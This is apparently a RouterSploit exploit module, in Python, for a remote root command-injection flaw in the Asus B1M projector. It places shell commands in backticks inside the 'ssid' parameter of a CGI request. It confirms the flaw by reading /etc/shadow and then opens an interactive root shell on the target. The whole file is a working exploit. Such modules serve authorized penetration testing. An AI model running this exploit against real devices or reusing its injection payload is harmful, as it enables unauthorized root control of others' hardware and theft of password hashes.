from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Asus B1M Projector RCE",
        "description": "Module exploits Asus B1M Projector Remote Code Execution vulnerability which "
                       "allows executing command on operating system level with root privileges.",
        "authors": (
            "Hacker House <www.myhackerhouse.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.myhackerhouse.com/asus-b1m-projector-remote-root-0day/",
        ),
        "devices": (
            "Asus B1M Projector",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        path = "/cgi-bin/apply.cgi?ssid=\"%20\"`{}`".format(cmd)

        response = self.http_request(
            method="GET",
            path=path
        )

        if response is None:
            return ""

        return response.text

    @mute
    def check(self):
        cmd = "cat /etc/shadow"
        response_text = self.execute(cmd)

        if utils.detect_file_content(response_text, "/etc/shadow"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
